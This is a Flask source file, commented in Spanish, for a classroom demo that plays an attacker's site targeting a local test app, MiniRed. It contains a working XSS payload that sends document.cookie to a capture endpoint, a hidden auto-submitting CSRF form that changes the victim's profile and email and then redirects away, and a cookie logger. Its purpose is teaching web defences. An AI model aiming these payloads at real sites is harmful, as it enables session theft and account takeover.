"""
Sitio del ATACANTE para la demo (http://localhost:5001).

Simula una página maliciosa externa, para mostrar en clase cómo se ven desde
"afuera" los ataques CSRF y XSS contra MiniRed. Todo el efecto ocurre contra la
base de datos de prueba en localhost; no hay objetivos reales.

  /premio   -> página trampa que dispara el ataque CSRF contra MiniRed
  /captura  -> endpoint al que el XSS manda document.cookie (para evidenciar la fuga)
  /evidencia-> muestra lo capturado

Solo para uso académico en localhost.
"""
from datetime import datetime
from html import escape

from flask import Flask, request

app = Flask(__name__)
CAPTURAS = []

VICTIMA = "http://localhost:5000"


@app.route("/")
def inicio():
    return f"""<!doctype html><meta charset="utf-8"><title>Sitio atacante</title>
<body style="font-family:system-ui;max-width:700px;margin:40px auto;padding:0 16px">
<h1>Panel del atacante (demo académica)</h1>
<ul>
  <li><a href="/premio">/premio</a> – pagina trampa CSRF</li>
  <li><a href="/evidencia">/evidencia</a> – capturas recibidas del XSS ({len(CAPTURAS)})</li>
</ul>
<h2>Payload XSS para pegar en el muro de MiniRed</h2>
<pre style="background:#eee;padding:10px;white-space:pre-wrap">&lt;img src=x onerror="new Image().src='http://localhost:5001/captura?c='+encodeURIComponent(document.cookie)"&gt;</pre>
<p>En modo VULNERABLE la cookie llega con valor. En modo SEGURO llega vacia (HttpOnly)
o el script ni se ejecuta (CSP): esa es la demostracion.</p>
</body>"""


@app.route("/premio")
def premio():
    # Pagina "inocente". El formulario oculto hace un POST a MiniRed y el navegador
    # de la victima adjunta su cookie de sesion automaticamente. Demuestra por que
    # hace falta un token anti-CSRF: sin el, la accion se ejecuta desde otro origen.
    return f"""<!doctype html><meta charset="utf-8"><title>Ganaste</title>
<body style="font-family:system-ui;text-align:center;margin-top:80px">
  <h1>Felicitaciones, ganaste un premio</h1>
  <p>Procesando, no cierres esta ventana...</p>
  <iframe name="oculto" style="display:none"></iframe>
  <form id="f" action="{VICTIMA}/perfil/editar" method="POST" target="oculto">
    <input type="hidden" name="display_name" value="Cuenta modificada por CSRF">
    <input type="hidden" name="email" value="atacante@evil.example">
    <input type="hidden" name="bio" value="Este perfil fue modificado por un ataque CSRF de demostracion.">
  </form>
  <script>
    document.getElementById('f').submit();
    // Despues del envio oculto, devolver a la victima a MiniRed como si nada hubiera pasado
    setTimeout(function () {{ location.href = "{VICTIMA}/perfil"; }}, 2500);
  </script>
</body>"""


@app.route("/captura")
def captura():
    dato = request.args.get("c", "")
    registro = {
        "hora": datetime.now().strftime("%H:%M:%S"),
        "cookie": dato,
        "desde": request.headers.get("Referer", "-"),
    }
    CAPTURAS.append(registro)
    print(f"\n[demo] captura recibida: {registro}\n", flush=True)
    return "", 204


@app.route("/evidencia")
def evidencia():
    filas = "".join(
        f"<tr><td>{escape(r['hora'])}</td><td><code>{escape(r['cookie']) or '(vacia: HttpOnly activo)'}</code></td>"
        f"<td>{escape(r['desde'])}</td></tr>"
        for r in reversed(CAPTURAS)
    )
    return f"""<!doctype html><meta charset="utf-8"><title>Evidencia</title>
<body style="font-family:system-ui;max-width:1000px;margin:40px auto;padding:0 16px">
<h1>Capturas recibidas del XSS ({len(CAPTURAS)})</h1>
<p><a href="/evidencia">actualizar</a> · <a href="/">volver</a></p>
<table border="1" cellpadding="6" style="border-collapse:collapse;width:100%;word-break:break-all">
<tr><th>Hora</th><th>document.cookie recibido</th><th>Pagina de origen</th></tr>{filas}</table>
<p>Lectura del resultado: si la columna del medio trae texto, el muro vulnerable dejo que
un script de otro usuario leyera la cookie de sesion. Si llega vacia, HttpOnly cumplio su
funcion. Es la evidencia de la contramedida, no un paso para reutilizar la sesion.</p>
</body>"""


if __name__ == "__main__":
    print("\n  Sitio atacante en  http://localhost:5001\n")
    app.run(host="127.0.0.1", port=5001, debug=False)
